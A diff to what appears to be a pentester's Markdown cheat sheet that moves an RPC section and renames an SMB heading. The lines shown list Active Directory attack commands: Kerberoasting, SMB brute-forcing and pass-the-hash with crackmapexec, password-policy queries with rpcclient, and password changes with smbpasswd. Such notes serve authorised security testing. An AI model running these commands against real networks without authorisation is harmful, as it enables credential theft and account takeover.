@@ -15,7 +15,12 @@ Kerberoasting:
 `crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>` remote
 `setspn -T medin -Q */*` local
 
-## SMB & NetBIOS
+## RPC
+Password policy:
+`rpcclient -U '<USER>%<PASS>' <IP> -c 'getdompwinfo'` (domain info)
+`rpcclient -U '<USER>%<PASS>' <IP> -c 'getusrdompwinfo'` (user info)
+
+## NetBIOS & SMB
 Brute-forcing:
 `crackmapexec smb <IP> -u <USER> -H <HASHES>`
 `crackmapexec smb <IP> -u <USER> -p <PASSLIST>`
@@ -26,8 +31,3 @@ Password policy:
 
 Change users password:
 `smbpasswd -U <USER> -r <IP>`
-
-## RPC
-Password policy:
-`rpcclient -U '<USER>%<PASS>' <IP> -c 'getdompwinfo'` (domain info)
-`rpcclient -U '<USER>%<PASS>' <IP> -c 'getusrdompwinfo'` (user info)
